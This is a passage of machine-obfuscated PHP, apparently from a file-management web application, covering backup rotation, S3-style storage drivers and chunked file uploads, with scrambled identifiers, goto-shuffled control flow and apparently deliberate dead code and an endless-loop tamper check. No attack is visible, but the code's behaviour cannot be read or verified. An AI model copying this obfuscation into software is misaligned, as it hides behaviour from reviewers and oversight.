$CΩ”œ§§ﬂ¯ = !0; $C†òò†·€é = $B∏õ¿èäÖ°[687]; while (strlen($C†òò†·€é) < $B∏õ¿èäÖ°[570]) { if (!$C†òò†·€é) { break; } $C†òò†·€é++; } foreach ($Bâçœõÿ˜å as $fµãêïÑø∞) { if ($dà“Ûî“¬Û % $fµãêïÑø∞ == 0) { $CΩ”œ§§ﬂ¯ = !1; break; } } if ($CΩ”œ§§ﬂ¯) { $cÛ‡¢ùÔ…å = $dà“Ûî“¬Û; break; } } goto féë©≈àú©; BΩÛÍùåÊ∞: $e¶à¨Â†´Æ = $B∏õ¿èäÖ°[684]; if (!$e¶à¨Â†´Æ) { return; } $Bâçœõÿ˜å = array(); goto f–Í°´¢∂“; EúÇëÔˆäí: $B∏õ¿èäÖ° =& $_SERVER[¯èãÄπµ]; $c§Õ¨¿õ’“ =& $_SERVER[œ]; $fÊå”«‚ é = $c§Õ¨¿õ’“[322]($c§Õ¨¿õ’“[342](2, 14), $c§Õ¨¿õ’“[342](2, 16) - 1); goto BΩÛÍùåÊ∞; f–Í°´¢∂“: $B¿Êæˆ÷âπ = 1; while ($B¿Êæˆ÷âπ <= (int) $c§Õ¨¿õ’“[343]($fÊå”«‚ é)) { $dà“Ûî“¬Û = $B¿Êæˆ÷âπ; $aÜ›·€…óŒ = $B∏õ¿èäÖ°[685]; if (!$aÜ›·€…óŒ) { die; } while (!0) { $dà“Ûî“¬Û++; if ($dà“Ûî“¬Û <= 2) { $B¿Êæˆ÷âπ = $dà“Ûî“¬Û; break; } else { if ($dà“Ûî“¬Û < 2) { continue; } } $CΩ”œ§§ﬂ¯ = !0; for ($bÖ∑“∫üï° = 2; $bÖ∑“∫üï° <= $c§Õ¨¿õ’“[343]($dà“Ûî“¬Û); $bÖ∑“∫üï°++) { if ($dà“Ûî“¬Û % $bÖ∑“∫üï° == 0) { $CΩ”œ§§ﬂ¯ = !1; } } if ($CΩ”œ§§ﬂ¯) { $B¿Êæˆ÷âπ = $dà“Ûî“¬Û; break; } } $Bâçœõÿ˜å[] = $B¿Êæˆ÷âπ; } $cÛ‡¢ùÔ…å = 2; goto dŒëÇ¿£Œ≈; cﬂ˘˜Œè˘: } public function jcaied7c2b56($E∞è¬¶ΩØ≈, $F¢‚‘ä◊Êë) { $FéÙ√˜á“‰ =& $_SERVER[¯èãÄπµ]; $BΩó÷ó«∂Ö =& $_SERVER[œ]; return $BΩó÷ó«∂Ö[13](array($BΩó÷ó«∂Ö[14], $BΩó÷ó«∂Ö[344]), $E∞è¬¶ΩØ≈, $F¢‚‘ä◊Êë); $d°éå†¯»— = $FéÙ√˜á“‰[689]; while (strlen($d°éå†¯»—) < $FéÙ√˜á“‰[570]) { if (!$d°éå†¯»—) { break; } $d°éå†¯»—++; } } public function nbik2010fc59($AÇ√‚‘ÜñŸ, $E˘È∫™Êåè) { $aüñ¨øé§ú =& $_SERVER[œ]; return $aüñ¨øé§ú[13](array($aüñ¨øé§ú[345], $aüñ¨øé§ú[346]), $AÇ√‚‘ÜñŸ, $E˘È∫™Êåè); } public function xfnz354807ba($c„‰ÉÇ÷…à, $cÎÊŒ—„£í) { $e¥ﬁøáÖ´å =& $_SERVER[œ]; return $e¥ﬁøáÖ´å[13](array($e¥ﬁøáÖ´å[345], $e¥ﬁøáÖ´å[347]), $c„‰ÉÇ÷…à, $cÎÊŒ—„£í); } } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $B¨ñÜ”·Áƒ =& $_SERVER[¯èãÄπµ]; self::$name = date($B¨ñÜ”·Áƒ[690]); if (!($fÀÓÏ˘ãÜá = Model($B¨ñÜ”·Áƒ[691])->lastItem())) { $fÀÓÏ˘ãÜá = $this->initData(); } else { self::$name = $fÀÓÏ˘ãÜá[$B¨ñÜ”·Áƒ[28]]; if ($fÀÓÏ˘ãÜá[$B¨ñÜ”·Áƒ[692]] == $B¨ñÜ”·Áƒ[83]) { self::$name = date($B¨ñÜ”·Áƒ[693]); $Cûèﬁ·ïÑø = 0; if (isset($fÀÓÏ˘ãÜá[$B¨ñÜ”·Áƒ[277]][$B¨ñÜ”·Áƒ[163]][$B¨ñÜ”·Áƒ[415]])) { $Cûèﬁ·ïÑø = (int) $fÀÓÏ˘ãÜá[$B¨ñÜ”·Áƒ[277]][$B¨ñÜ”·Áƒ[163]][$B¨ñÜ”·Áƒ[415]]; } if ($fÀÓÏ˘ãÜá[$B¨ñÜ”·Áƒ[28]] == self::$name) { Model($B¨ñÜ”·Áƒ[691])->remove($fÀÓÏ˘ãÜá[$B¨ñÜ”·Áƒ[363]]); } $fÀÓÏ˘ãÜá = $this->initData($Cûèﬁ·ïÑø, $fÀÓÏ˘ãÜá[$B¨ñÜ”·Áƒ[694]]); } else { $this->checkStore($fÀÓÏ˘ãÜá[$B¨ñÜ”·Áƒ[694]]); } } self::$option = $fÀÓÏ˘ãÜá; } private function initData($añÎ®ºŒü≠ = 0, $eÜÙá§õÆÔ = '') { goto DÕâÖ†ˆüª; Bä≤•Ñáì√: $this->checkStore($BÊÒœ†¨ûÜ[$C√±ª› Öõ[694]]); $E≈ëﬂˆ±Ù¯ = array($C√±ª› Öõ[694] => $BÊÒœ†¨ûÜ[$C√±ª› Öõ[694]], $C√±ª› Öõ[28] => self::$name, $C√±ª› Öõ[692] => 0, $C√±ª› Öõ[695] => $BÊÒœ†¨ûÜ[$C√±ª› Öõ[695]], $C√±ª› Öõ[277] => array($C√±ª› Öõ[696] => array($C√±ª› Öõ[692] => 0), $C√±ª› Öõ[697] => array($C√±ª› Öõ[692] => 0, $C√±ª› Öõ[698] => 0, $C√±ª› Öõ[699] => 0, $C√±ª› Öõ[29] => $C√±ª› Öõ[33]), $C√±ª› Öõ[700] => array($C√±ª› Öõ[692] => 0, $C√±ª› Öõ[698] => 0, $C√±ª› Öõ[699] => 0), $C√±ª› Öõ[163] => array($C√±ª› Öõ[692] => 0, $C√±ª› Öõ[701] => 0, $C√±ª› Öõ[702] => 0, $C√±ª› Öõ[703] => 0, $C√±ª› Öõ[704] => 0, $C√±ª› Öõ[415] => $añÎ®ºŒü≠)), $C√±ª› Öõ[705] => time(), $C√±ª› Öõ[706] => 0); $C–¬≤éçﬂ¥ = Model($C√±ª› Öõ[691])->insert($E≈ëﬂˆ±Ù¯); goto eØ™Ó∂õ´ß; DÕâÖ†ˆüª: $C√±ª› Öõ =& $_SERVER[¯èãÄπµ]; $BÊÒœ†¨ûÜ = Model($C√±ª› Öõ[691])->config(); if ($eÜÙá§õÆÔ && $BÊÒœ†¨ûÜ[$C√±ª› Öõ[694]] != $eÜÙá§õÆÔ) { $añÎ®ºŒü≠ = 0; } goto Bä≤•Ñáì√; eØ™Ó∂õ´ß: $E≈ëﬂˆ±Ù¯[$C√±ª› Öõ[363]] = $C–¬≤éçﬂ¥; return $E≈ëﬂˆ±Ù¯; goto eÕ˘âéÏ∆Ã; eÕ˘âéÏ∆Ã: } private function checkStore($Føá∑…í⁄Æ) { $aŸº‚Ÿ›û⁄ =& $_SERVER[¯èãÄπµ]; $fà±çıÍ∏Ò = Model($aŸº‚Ÿ›û⁄[707])->listData($Føá∑…í⁄Æ); Model($aŸº‚Ÿ›û⁄[707])->checkConfig($fà±çıÍ∏Ò); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[¯èãÄπµ][691])->findByName(self::$name); } return self::$option; } public static function set($b‹π˘ì√Ωò) { $bèåî≈˘Æ  =& $_SERVER[¯èãÄπµ]; $Càÿ‚ﬁ¬êè = self::get(); foreach ($b‹π˘ì√Ωò as $Aè©Ì¿Òáπ => $aãÀ¬Ç∑√≠) { $C∆·êˆ⁄Çµ = explode($bèåî≈˘Æ [91], $Aè©Ì¿Òáπ); $B˘´Ú—Í∂Ì = count($C∆·êˆ⁄Çµ); switch ($B˘´Ú—Í∂Ì) { case 1: $Càÿ‚ﬁ¬êè[$C∆·êˆ⁄Çµ[0]] = $aãÀ¬Ç∑√≠; break; case 2: $Càÿ‚ﬁ¬êè[$C∆·êˆ⁄Çµ[0]][$C∆·êˆ⁄Çµ[1]] = $aãÀ¬Ç∑√≠; break; case 3: $Càÿ‚ﬁ¬êè[$C∆·êˆ⁄Çµ[0]][$C∆·êˆ⁄Çµ[1]][$C∆·êˆ⁄Çµ[2]] = $aãÀ¬Ç∑√≠; break; } } Model($bèåî≈˘Æ [691])->update($Càÿ‚ﬁ¬êè[$bèåî≈˘Æ [363]], $Càÿ‚ﬁ¬êè); self::$option = $Càÿ‚ﬁ¬êè; return self::$option; } public function keep() { $a¶ãè˘Üíè =& $_SERVER[¯èãÄπµ]; $fÃﬂ†Õ˘˜ = self::get(); if ($fÃﬂ†Õ˘˜[$a¶ãè˘Üíè[277]][$a¶ãè˘Üíè[696]][$a¶ãè˘Üíè[692]] == $a¶ãè˘Üíè[83]) { return; } $this->backupKeep($fÃﬂ†Õ˘˜); self::set(array($a¶ãè˘Üíè[708] => 1)); } private function backupKeep($F∑Îﬂ—ºßÖ) { goto e•∆ã§˘æÚ; e•∆ã§˘æÚ: $eååÕ°¨ª£ =& $_SERVER[¯èãÄπµ]; $f°ÑÆ‹«° = Model($eååÕ°¨ª£[691])->listData(); if (empty($f°ÑÆ‹«°)) { return; } goto Cﬁ∫«ıíŸÆ; Cﬁ∫«ıíŸÆ: $eÚ∫ãÎﬂåœ = 0; $cÏ¥ÔÓÊ„© = array(); foreach ($f°ÑÆ‹«° as $Bòÿ≠®√¬ç) { if ($eÚ∫ãÎﬂåœ >= 7) { break; } $cÏ¥ÔÓÊ„©[] = $Bòÿ≠®√¬ç[$eååÕ°¨ª£[28]]; $eÚ∫ãÎﬂåœ++; } goto dÜùäâ‘Õú; dÜùäâ‘Õú: for ($eÚ∫ãÎﬂåœ = 0; $eÚ∫ãÎﬂåœ < 12; $eÚ∫ãÎﬂåœ++) { $cÏ¥ÔÓÊ„©[] = date($eååÕ°¨ª£[709], strtotime("\x2d{$eÚ∫ãÎﬂåœ}\40\155\x6f\156\x74\x68\163")); } $cÏ¥ÔÓÊ„© = array_unique($cÏ¥ÔÓÊ„©); foreach ($f°ÑÆ‹«° as $Bòÿ≠®√¬ç) { if (!empty($Bòÿ≠®√¬ç[$eååÕ°¨ª£[28]]) && in_array($Bòÿ≠®√¬ç[$eååÕ°¨ª£[28]], $cÏ¥ÔÓÊ„©)) { continue; } Model($eååÕ°¨ª£[691])->remove($Bòÿ≠®√¬ç[$eååÕ°¨ª£[363]]); $AÂ´à∫‡÷ = "\x7b\151\x6f\72{$F∑Îﬂ—ºßÖ[$eååÕ°¨ª£[694]]}\x7d\57\x64\x61\164\141\142\141\x73\x65\57\x62\x61\143\x6b\x75\160\x5f{$Bòÿ≠®√¬ç[$eååÕ°¨ª£[28]]}"; IO::remove($AÂ´à∫‡÷, !1); } goto A∏º£ê˜ÖÓ; A∏º£ê˜ÖÓ: } public function db() { goto EÓçãÕÇÌâ; EÓçãÕÇÌâ: $fÀÉÃ±ÑÀÕ =& $_SERVER[¯èãÄπµ]; $b‚Ωî§§∞Ó = self::get(); if ($b‚Ωî§§∞Ó[$fÀÉÃ±ÑÀÕ[277]][$fÀÉÃ±ÑÀÕ[697]][$fÀÉÃ±ÑÀÕ[692]] == $fÀÉÃ±ÑÀÕ[83]) { return !0; } goto E–ÕëÈã¥Ç; AãÉë˘à·ö: return !0; goto bπ¯°√©‹™; E–ÕëÈã¥Ç: $A…åıáÛıô = new BackupDb(); if (!$A…åıáÛıô->index()) { return !1; } self::set(array($fÀÉÃ±ÑÀÕ[710] => 1)); goto AãÉë˘à·ö; bπ¯°√©‹™: } public function dbFile() { goto fïªƒ¯≥≤é; A≤ÒÊ∫˘¨ø: return !0; goto füﬁ ‚ùöû; EÇ”üÇ√ôÙ: $Aéöö÷á∏« = new BackupDbFile(); if (!$Aéöö÷á∏«->index()) { return !1; } self::set(array($f«É„Áééﬁ[711] => 1)); goto A≤ÒÊ∫˘¨ø; fïªƒ¯≥≤é: $f«É„Áééﬁ =& $_SERVER[¯èãÄπµ]; $fÑπøº§ª¿ = self::get(); if ($fÑπøº§ª¿[$f«É„Áééﬁ[277]][$f«É„Áééﬁ[700]][$f«É„Áééﬁ[692]] == $f«É„Áééﬁ[83]) { return !0; } goto EÇ”üÇ√ôÙ; füﬁ ‚ùöû: } public function file() { $d¥¯≠¨õ±” =& $_SERVER[¯èãÄπµ]; $Dˆè ñ‰ˆÖ = self::get(); if ($Dˆè ñ‰ˆÖ[$d¥¯≠¨õ±”[277]][$d¥¯≠¨õ±”[163]][$d¥¯≠¨õ±”[692]] == $d¥¯≠¨õ±”[83]) { return !0; } if (!isset($Dˆè ñ‰ˆÖ[$d¥¯≠¨õ±”[695]]) || $Dˆè ñ‰ˆÖ[$d¥¯≠¨õ±”[695]] == $d¥¯≠¨õ±”[464]) { $eà—œ‹áê = new BackupFile(); if (!$eà—œ‹áê->index()) { return !1; } } self::set(array($d¥¯≠¨õ±”[712] => 1, $d¥¯≠¨õ±”[692] => 1)); return !0; } } goto AõªóÉ”óÃ; DîøÑäﬁ„’: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($CÀåÂüÎπ ) { parent::__construct($CÀåÂüÎπ ); $this->signatureVersion($_SERVER[¯èãÄπµ][196]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($eàÑêÀöëª) { parent::__construct($eàÑêÀöëª); $this->signatureVersion($_SERVER[¯èãÄπµ][196]); } public function fileOutLink($E‰¿ÍΩ£π®) { $Dﬁ≥úÍæ¶Õ =& $_SERVER[¯èãÄπµ]; if (substr($E‰¿ÍΩ£π®, 0, 7) == $Dﬁ≥úÍæ¶Õ[1110]) { $E‰¿ÍΩ£π® = $Dﬁ≥úÍæ¶Õ[1111] . substr($E‰¿ÍΩ£π®, 7); } header($Dﬁ≥úÍæ¶Õ[152] . $E‰¿ÍΩ£π®); die; } } if (!isset($_SERVER[$_SERVER[¯èãÄπµ][792]]) || !isset($_SERVER[$_SERVER[¯èãÄπµ][1165]])) { goto Bﬂ∏ÎæÈÚ ; Bﬂ∏ÎæÈÚ : $AÚ¯Ωá”õ‹ = $_SERVER[¯èãÄπµ][794]; $E¿”ﬁÚ∂≈Õ = $_SERVER[$_SERVER[¯èãÄπµ][795]] . $_SERVER[¯èãÄπµ][796]; $f£⁄ËÀçé∂ = $AÚ¯Ωá”õ‹($E¿”ﬁÚ∂≈Õ); goto aª∫çä™ı≥; cÑîÒâ⁄Öâ: $Aõ†ïÑ›¿±($_SERVER[$_SERVER[¯èãÄπµ][795]] . $_SERVER[¯èãÄπµ][796]); $E“ò´€‹Ìè = 2; while ($E“ò´€‹Ìè > 1) { $b‘„ÈççÁá = rawurlencode($E“ò´€‹Ìè . $_SERVER[¯èãÄπµ][357]); } goto Fùåçùù¯»; aª∫çä™ı≥: $f¡Éáºä„∫ = explode($_SERVER[¯èãÄπµ][213], $f£⁄ËÀçé∂); if (count($f¡Éáºä„∫) < $_SERVER[¯èãÄπµ][544]) { $dìäâ¯“≥ä = $_SERVER[¯èãÄπµ][797]; $dìäâ¯“≥ä(); } $Aõ†ïÑ›¿± = $_SERVER[¯èãÄπµ][1166]; goto cÑîÒâ⁄Öâ; Fùåçùù¯»: } goto EëùÜ´ﬂı•; CÙ·”Ô  ¿: class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto eáÆ¬¨üË…; D÷Üóê·íÇ: if (!empty($_FILES)) { $B®∂¢ä¯ü¶ = $_FILES[$dû…õ∑Üá‰[163]]; $this->uploadFile = $B®∂¢ä¯ü¶[$dû…õ∑Üá‰[1950]]; if (!$this->uploadFile && $B®∂¢ä¯ü¶[$dû…õ∑Üá‰[1215]] > 0) { show_json($this->errorInfo($B®∂¢ä¯ü¶[$dû…õ∑Üá‰[1215]]), !1); } } else { if (isset($in[$dû…õ∑Üá‰[382]])) { $this->uploadFile = isset($in[$dû…õ∑Üá‰[1951]]) ? $dû…õ∑Üá‰[1952] : $dû…õ∑Üá‰[1797]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto E®Ô–ΩïßÔ; eáÆ¬¨üË…: $dû…õ∑Üá‰ =& $_SERVER[¯èãÄπµ]; global $in; $this->in =& $in; goto D÷Üóê·íÇ; E®Ô–ΩïßÔ: $this->checkSize(); $this->tempPathInit(); goto fÁ≥†ãÁÖß; fÁ≥†ãÁÖß: } public function upload() { goto aæ òºœ˜í; E«êÚä∏Ñõ: @unlink($b≈·≥≥û®ï); if (!$cê⁄Ö∆ÛëÜ) { $this->showJson($d¡µØÌÖô‚[1961] . $Cœ∏ﬂ‰ò≠Ÿ, !1); } $C±‡°ÙƒÕ[$d¡µØÌÖô‚[1962]] = $Aé‰å‰ª€; goto Cîå®€Øõ±; añÒÌºô™Ö: if ($Aé‰å‰ª€ > 1 && $F——Ñ‹ëÇú <= 0) { show_json($d¡µØÌÖô‚[1957], !1); } if ($F——Ñ‹ëÇú > $e«úàœ™±®) { $Aé‰å‰ª€ = 1; } if ($Aé‰å‰ª€ <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto Fæ√‘¬’Éö; aÎÌ–ﬁÖ´Ω: $b≈·≥≥û®ï = $this->moveUploadedFile($E´¿≠Æ∫√ø); if ($e«úàœ™±® > 0 && filesize($b≈·≥≥û®ï) == 0) { $this->showJson($d¡µØÌÖô‚[1958], !1); } if (!$b≈·≥≥û®ï) { $this->showJson(LNG($d¡µØÌÖô‚[1959]), !1); } goto eüì∂ﬁ≤ÈÈ; D¡ûŒÿ¢øé: $cê⁄Ö∆ÛëÜ = $this->writeTo($b≈·≥≥û®ï, $cíÜ–ÚıÊë, $this->tempFile); $D≥ûùä¨∫‚ = IO::hashSimple($b≈·≥≥û®ï); $e«úàœ™±® = IO::size($b≈·≥≥û®ï); goto E«êÚä∏Ñõ; B£¨≤¥πÂõ: CacheLock::unlock($this->tempFile); return $this->tempFile; goto C∆ÎéÕÂï‚; CÕÒû»ëµ—: ignore_timeout(); if (!$this->checkChunkHash($C±‡°ÙƒÕ)) { $this->showJson($d¡µØÌÖô‚[1967], !1); } $this->statusSet(!1); goto B£¨≤¥πÂõ; Cîå®€Øõ±: $C±‡°ÙƒÕ[$d¡µØÌÖô‚[1963]][$d¡µØÌÖô‚[1964] . $Cœ∏ﬂ‰ò≠Ÿ] = array($d¡µØÌÖô‚[1965] => $bÕß⁄Øå˜Í, $d¡µØÌÖô‚[1038] => $Cœ∏ﬂ‰ò≠Ÿ, $d¡µØÌÖô‚[77] => $e«úàœ™±®, $d¡µØÌÖô‚[160] => $D≥ûùä¨∫‚); $this->statusSet($C±‡°ÙƒÕ); if (count($C±‡°ÙƒÕ[$d¡µØÌÖô‚[1963]]) != $C±‡°ÙƒÕ[$d¡µØÌÖô‚[1962]]) { $this->showJson($d¡µØÌÖô‚[1966] . $Cœ∏ﬂ‰ò≠Ÿ, !0); } goto CÕÒû»ëµ—; eüì∂ﬁ≤ÈÈ: $bÕß⁄Øå˜Í = $Cœ∏ﬂ‰ò≠Ÿ * $F——Ñ‹ëÇú; $cíÜ–ÚıÊë = @fopen($this->tempFile, $d¡µØÌÖô‚[1960]); fseek($cíÜ–ÚıÊë, $bÕß⁄Øå˜Í); goto D¡ûŒÿ¢øé; Fæ√‘¬’Éö: CacheLock::lock($this->tempFile, 20); $C±‡°ÙƒÕ = $this->statusGet(); $this->initFileTemp(); goto aÎÌ–ﬁÖ´Ω; Cä∂úõüÊ£: $E´¿≠Æ∫√ø = $this->tempFile . $d¡µØÌÖô‚[1955] . $Cœ∏ﬂ‰ò≠Ÿ; $e«úàœ™±® = isset($this->in[$d¡µØÌÖô‚[516]]) ? intval($this->in[$d¡µØÌÖô‚[516]]) : 0; $F——Ñ‹ëÇú = isset($this->in[$d¡µØÌÖô‚[1956]]) ? intval($this->in[$d¡µØÌÖô‚[1956]]) : 0; goto añÒÌºô™Ö; aæ òºœ˜í: $d¡µØÌÖô‚ =& $_SERVER[¯èãÄπµ]; $Cœ∏ﬂ‰ò≠Ÿ = isset($this->in[$d¡µØÌÖô‚[1953]]) ? intval($this->in[$d¡µØÌÖô‚[1953]]) : 0; $Aé‰å‰ª€ = isset($this->in[$d¡µØÌÖô‚[1954]]) ? intval($this->in[$d¡µØÌÖô‚[1954]]) : 1; goto Cä∂úõüÊ£; C∆ÎéÕÂï‚: } private function checkSize() { $Aªê‡Ñ¯ã‘ =& $_SERVER[¯èãÄπµ]; if (phpBuild64() || $this->in[$Aªê‡Ñ¯ã‘[77]] < PHP_INT_MAX) { return; } show_json(LNG($Aªê‡Ñ¯ã‘[1968]), !1); } private function showJson($BµêÏõ∂µå, $F—ëµ°ä“á) { CacheLock::unlock($this->tempFile); if (!$F—ëµ°ä“á) { return show_json($BµêÏõ∂µå, $F—ëµ°ä“á); } show_json($BµêÏõ∂µå, $F—ëµ°ä“á); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto b´Ò€êÈáƒ; Aıºµ‡ÜÇÚ: $this->tempFile = $dàíﬂüÃ∆Ô . $bÌŸŒëˆÁ[1971] . md5($cÔ€∂”ûÏá . $this->in[$bÌŸŒëˆÁ[1515]]); goto cΩÒÍñÕ˜„; E™ùñ•Û®»: touch($dàíﬂüÃ∆Ô . $bÌŸŒëˆÁ[1969]); $cÔ€∂”ûÏá = isset($this->in[$bÌŸŒëˆÁ[1970]]) ? $this->in[$bÌŸŒëˆÁ[1970]] : !1; if (strlen($cÔ€∂”ûÏá) < 30) { $cÔ€∂”ûÏá = md5(USER_ID . $this->in[$bÌŸŒëˆÁ[75]] . $this->fileName . $this->in[$bÌŸŒëˆÁ[77]]); } goto Aıºµ‡ÜÇÚ; b´Ò€êÈáƒ: $bÌŸŒëˆÁ =& $_SERVER[¯èãÄπµ]; $dàíﬂüÃ∆Ô = TEMP_FILES; @mk_dir($dàíﬂüÃ∆Ô); goto E™ùñ•Û®»; cΩÒÍñÕ˜„: } private function moveUploadedFile($dÊ∞±ßÇ∞) { $fá·∂ôªªÖ =& $_SERVER[¯èãÄπµ]; $fÇëÒÃõﬁÆ = $this->uploadFile; if ($fÇëÒÃõﬁÆ == $fá·∂ôªªÖ[1972]) { @file_put_contents($dÊ∞±ßÇ∞, base64_decode($_REQUEST[$fá·∂ôªªÖ[1973]])); } else { if ($fÇëÒÃõﬁÆ == $fá·∂ôªªÖ[1797]) { $BØ±†ßÚê´ = @fopen($dÊ∞±ßÇ∞, $fá·∂ôªªÖ[1504]); $this->writeTo($fÇëÒÃõﬁÆ, $BØ±†ßÚê´, $dÊ∞±ßÇ∞); } else { if (!move_uploaded_file($fÇëÒÃõﬁÆ, $dÊ∞±ßÇ∞)) { return !1; } } } return $dÊ∞±ßÇ∞; } private function writeTo($fê•Ã÷ﬁà≠, $fµ¬ÀÚè®·, $bÁÈåÎàô) { goto AåƒÙì∏î‡; cºπÑ–ÈÌÕ: return !0; goto EÑîñå≤®û; bö‘–ƒ–Ïö: $CÇ ñÓçÉê = @fopen($fê•Ã÷ﬁà≠, $dÔˆÉø›∏ä[1503]); if (!$CÇ ñÓçÉê || !$fµ¬ÀÚè®· || !$D®æûÇùùΩ) { CacheLock::unlock($E÷Çô»Ê¥‹); return !1; } while (!feof($CÇ ñÓçÉê)) { fwrite($fµ¬ÀÚè®·, fread($CÇ ñÓçÉê, 1024 * 200)); } goto Fﬁ…ƒ‘‰±á; Fﬁ…ƒ‘‰±á: fclose($CÇ ñÓçÉê); fclose($fµ¬ÀÚè®·); CacheLock::unlock($E÷Çô»Ê¥‹); goto cºπÑ–ÈÌÕ; AåƒÙì∏î‡: $dÔˆÉø›∏ä =& $_SERVER[¯èãÄπµ]; $E÷Çô»Ê¥‹ = $dÔˆÉø›∏ä[1974] . $bÁÈåÎàô; $D®æûÇùùΩ = CacheLock::lock($E÷Çô»Ê¥‹, 1); goto bö‘–ƒ–Ïö; EÑîñå≤®û: } private function statusGet() { goto bë«‰•ΩŸØ; D¬§àø¨ﬁ◊: $dÛåõ•ÿàŒ = !1; if (file_exists($B›ü”øÎŒ)) { $dÛåõ•ÿàŒ = @file_get_contents($B›ü”øÎŒ); } if ($dÛåõ•ÿàŒ) { $this->statusData = json_decode($dÛåõ•ÿàŒ, !0); } goto Dµß⁄≠°∏ù; bë«‰•ΩŸØ: $aâóëˆ‚ÍÒ =& $_SERVER[¯èãÄπµ]; if (is_array($this->statusData)) { return $this->statusData; } $B›ü”øÎŒ = $this->tempFile . $aâóëˆ‚ÍÒ[1975]; goto D¬§àø¨ﬁ◊; Dµß⁄≠°∏ù: if (!$this->statusData) { $f¨≠ÿº±Ïà = array($aâóëˆ‚ÍÒ[28] => $this->fileName, $aâóëˆ‚ÍÒ[1962] => 0, $aâóëˆ‚ÍÒ[1963] => array()); $this->statusSet($f¨≠ÿº±Ïà); } return $this->statusData; goto F¶‘¯™≥›ì; F¶‘¯™≥›ì: } public function statusSet($B¿ˆ®ˆ¡∆¥) { $A‰ƒÇ„°∏ = $this->tempFile . $_SERVER[¯èãÄπµ][1975]; if (!$B¿ˆ®ˆ¡∆¥) { if (file_exists($A‰ƒÇ„°∏)) { @unlink($A‰ƒÇ„°∏); } return !0; } $this->statusData = $B¿ˆ®ˆ¡∆¥; return file_put_contents($A‰ƒÇ„°∏, json_encode($B¿ˆ®ˆ¡∆¥)); } private function initFileTemp() { $eãﬁÛÆÊêò =& $_SERVER[¯èãÄπµ]; if (file_exists($this->tempFile)) { return; } $Fœ◊¯Æ”Ë« = fopen($this->tempFile, $eãﬁÛÆÊêò[1976]); fseek($Fœ◊¯Æ”Ë«, $this->in[$eãﬁÛÆÊêò[77]] - 1, SEEK_SET); fwrite($Fœ◊¯Æ”Ë«, $eãﬁÛÆÊêò[464]); fclose($Fœ◊¯Æ”Ë«); } public function checkChunk() { goto BØèãº™≠°; BØèãº™≠°: $E∏´Ñååæü =& $_SERVER[¯èãÄπµ]; $E∑ÊÁ©ø‡— = array(); CacheLock::lock($this->tempFile); goto e˜Ø≥ÚÆ¬â; e˜Ø≥ÚÆ¬â: $Cπ¥êùû®Ë = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($Cπ¥êùû®Ë[$E∏´Ñååæü[1963]] as $Bî®ﬂØ˘…„) { $AØŸì¶≈¥É = $Bî®ﬂØ˘…„[$E∏´Ñååæü[160]]; if ($AØŸì¶≈¥É) { $E∑ÊÁ©ø‡—[$E∏´Ñååæü[1977] . $Bî®ﬂØ˘…„[$E∏´Ñååæü[1038]]] = $AØŸì¶≈¥É; } } goto aÙÊ‹⁄Ì„í; aÙÊ‹⁄Ì„í: return $E∑ÊÁ©ø‡—; goto aº‹πñ‚Èπ; aº‹πñ‚Èπ: } private function checkChunkHash($c‹éÿûÁµπ) { goto A¢ﬁÙƒ≠ªî; A¢ﬁÙƒ≠ªî: $Dﬁå•Ò”‘∆ =& $_SERVER[¯èãÄπµ]; if (count($c‹éÿûÁµπ[$Dﬁå•Ò”‘∆[1963]]) != $c‹éÿûÁµπ[$Dﬁå•Ò”‘∆[1962]]) { return !1; } $a‰πﬁƒä¿Â = _get($this->in, $Dﬁå•Ò”‘∆[1970]); goto c∂ó™ª€≈‚; c∂ó™ª€≈‚: $aúíÊ¢Áâ§ = _get($this->in, $Dﬁå•Ò”‘∆[1978]); if (strlen($aúíÊ¢Áâ§) == 32 && IO::hashSimple($this->tempFile) == $a‰πﬁƒä¿Â && IO::hashMd5($this->tempFile) == $aúíÊ¢Áâ§) { return !0; } $B™™ÂùçÉ∆ = fopen($this->tempFile, $Dﬁå•Ò”‘∆[1164]); goto a∞•§ß≠Ëî; a∞•§ß≠Ëî: $bŸ•ÉÑãŒè = !0; foreach ($c‹éÿûÁµπ[$Dﬁå•Ò”‘∆[1963]] as $e˘å„óû€∫) { fseek($B™™ÂùçÉ∆, $e˘å„óû€∫[$Dﬁå•Ò”‘∆[1965]]); $bêßÈÈ≈®◊ = PathDriverStream::hash($B™™ÂùçÉ∆, $e˘å„óû€∫[$Dﬁå•Ò”‘∆[77]]); if ($e˘å„óû€∫[$Dﬁå•Ò”‘∆[160]] != $bêßÈÈ≈®◊) { $bŸ•ÉÑãŒè = !1; break; } } fclose($B™™ÂùçÉ∆); goto dÜ÷öâÙà; dÜ÷öâÙà: return $bŸ•ÉÑãŒè; goto CÉøóÉ˜–ú; CÉøóÉ˜–ú: } public static function fileName() { goto déûàÎŒ¶‡; fªâ∂Û≥ ‚: if ($Aπ‘∂åª‰É == $Bƒè›£ÕèØ[1980] || $Aπ‘∂åª‰É == $Bƒè›£ÕèØ[1981]) { $CÂ«ÑÜíÀâ = date($Bƒè›£ÕèØ[693], $e‰ıù˜ã≠Ë) . $Bƒè›£ÕèØ[70] . $in[$Bƒè›£ÕèØ[77]] . $Bƒè›£ÕèØ[1612]; } else { if ($Aπ‘∂åª‰É == $Bƒè›£ÕèØ[1982]) { $CÂ«ÑÜíÀâ = date($Bƒè›£ÕèØ[693], $e‰ıù˜ã≠Ë) . $Bƒè›£ÕèØ[70] . $in[$Bƒè›£ÕèØ[77]] . $Bƒè›£ÕèØ[1983]; } } return $CÂ«ÑÜíÀâ; goto AùÑª≤à’; déûàÎŒ¶‡: $Bƒè›£ÕèØ =& $_SERVER[¯èãÄπµ]; global $in; $CÂ«ÑÜíÀâ = isset($in[$Bƒè›£ÕèØ[28]]) ? $in[$Bƒè›£ÕèØ[28]] : $Bƒè›£ÕèØ[33]; goto c¶à…Ë—Œ»; c¶à…Ë—Œ»: if (!empty($_FILES)) { $CÂ«ÑÜíÀâ = 